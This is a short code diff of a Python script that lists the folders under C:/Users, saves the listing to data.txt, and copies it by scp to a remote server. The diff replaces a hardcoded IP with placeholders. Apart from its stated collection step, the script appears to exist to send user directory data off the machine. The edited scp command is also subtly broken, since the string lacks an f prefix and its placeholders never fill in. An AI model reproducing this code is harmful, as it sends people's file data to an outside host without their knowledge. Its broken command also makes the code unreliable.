@@ -27,7 +27,11 @@ root_directory = 'C:/Users'
 data = str(List_Folder().List(root_directory))
 with open("data.txt", "w") as file:
     file.write(data)
+
+remote_ip = "<Enter a valid Ip as string>"
+remote_location = "<Enter loaction where file must be stored>"
+
 try:
-    os.system("scp -i key.pem data.txt ubuntu@54.242.78.59:")
+    os.system("scp -i key.pem data.txt ubuntu@{remote_ip}:{remote_location}")
 except:
     raise ConnectionError
